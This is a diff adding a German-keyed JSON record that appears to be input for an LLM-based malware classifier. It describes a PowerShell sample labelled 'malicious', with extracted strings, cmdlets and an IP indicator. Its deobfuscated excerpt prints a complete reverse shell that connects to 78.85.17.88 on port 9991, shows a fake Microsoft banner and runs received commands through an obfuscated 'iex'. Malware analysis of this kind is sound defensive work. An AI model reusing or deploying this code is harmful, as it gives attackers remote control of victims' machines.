@@ -1,0 +1,70 @@
+{
+  "meta": {
+    "quelldatei": "0edf219fdf56fb6e0e69dae0538cc82427ac8ae8616bca83a3518c7711fa84fe.ps1",
+    "sha256": "0edf219fdf56fb6e0e69dae0538cc82427ac8ae8616bca83a3518c7711fa84fe",
+    "groesse_bytes": 815,
+    "zeilen": 18,
+    "ground_truth_label": "malicious",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "78.85.17.88",
+      "Copyright (C) 2022 Microsoft Corporation. All rights reserved.`n`n",
+      ")\n$SS.Write($OO,0,$OO.Length)\n[byte[]]$OO = 0..((2-shl(3*5))-1)|%{0};\nwhile(($A = $SS.Read($OO, 0, $OO.Length)) -ne 0){;$DD = (New-Object System.Text.UTF8Encoding).GetString($OO,0, $A);\n$GG = (i`eX $DD 2>&1 | Out-String );\n$H  = $GG + (pwd).Path + "
+    ],
+    "string_anzahl_gesamt": 3,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "78.85.17.88",
+      "Copyright (C) 2022 Microsoft Corporation. All rights reserved.`n`n",
+      ")\n$SS.Write($OO,0,$OO.Length)\n[byte[]]$OO = 0..((2-shl(3*5))-1)|%{0};\nwhile(($A = $SS.Read($OO, 0, $OO.Length)) -ne 0){;$DD = (New-Object System.Text.UTF8Encoding).GetString($OO,0, $A);\n$GG = (i`eX $DD 2>&1 | Out-String );\n$H  = $GG + (pwd).Path + "
+    ],
+    "string_anzahl_gesamt": 3,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Get-Location",
+      "New-Object",
+      "Out-String"
+    ],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [],
+      "ipv4": [
+        "78.85.17.88"
+      ],
+      "pfade": []
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "78.85.17.88",
+      "Copyright (C) 2022 Microsoft Corporation. All rights reserved.`n`n",
+      ")\n$SS.Write($OO,0,$OO.Length)\n[byte[]]$OO = 0..((2-shl(3*5))-1)|%{0};\nwhile(($A = $SS.Read($OO, 0, $OO.Length)) -ne 0){;$DD = (New-Object System.Text.UTF8Encoding).GetString($OO,0, $A);\n$GG = (i`eX $DD 2>&1 | Out-String );\n$H  = $GG + (pwd).Path + "
+    ],
+    "string_anzahl_gesamt": 3,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Get-Location",
+      "New-Object",
+      "Out-String"
+    ],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [],
+      "ipv4": [
+        "78.85.17.88"
+      ],
+      "pfade": []
+    },
+    "deobfuskiert_auszug": "#Twitter: @TihanyiNorbert (No AV detecetion 2022 March)\n#Reverse shell based on the original nishang Framework written by @nikhil_mitt.\n$J = New-Object System.Net.Sockets.TCPClient(\"78.85.17.88\", 9991);\n$SS = $J.GetStream();\n[byte[]]$OO = 0..((2-shl(3*5))-1)|%{0};\n$OO = ([text.encoding]::UTF8).GetBytes(\"Copyright (C) 2022 Microsoft Corporation. All rights reserved.nn\")\n$SS.Write($OO,0,$OO.Length)\n$OO = ([text.encoding]::UTF8).GetBytes((Get-Location).Path + '>')\n$SS.Write($OO,0,$OO.Length)\n[byte[]]$OO = 0..((2-shl(3*5))-1)|%{0};\nwhile(($A = $SS.Read($OO, 0, $OO.Length)) -ne 0){;$DD = (New-Object System.Text.UTF8Encoding).GetString($OO,0, $A);\n$GG = (ieX $DD 2>&1 | Out-String );\n$H  = $GG + (pwd).Path + '> ';\n$L = ([text.encoding]::UTF8).GetBytes($H);\n$SS.Write($L,0,$L.Length);\n$SS.Flush()};\n$J.Close()\n",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": []
+  }
+}
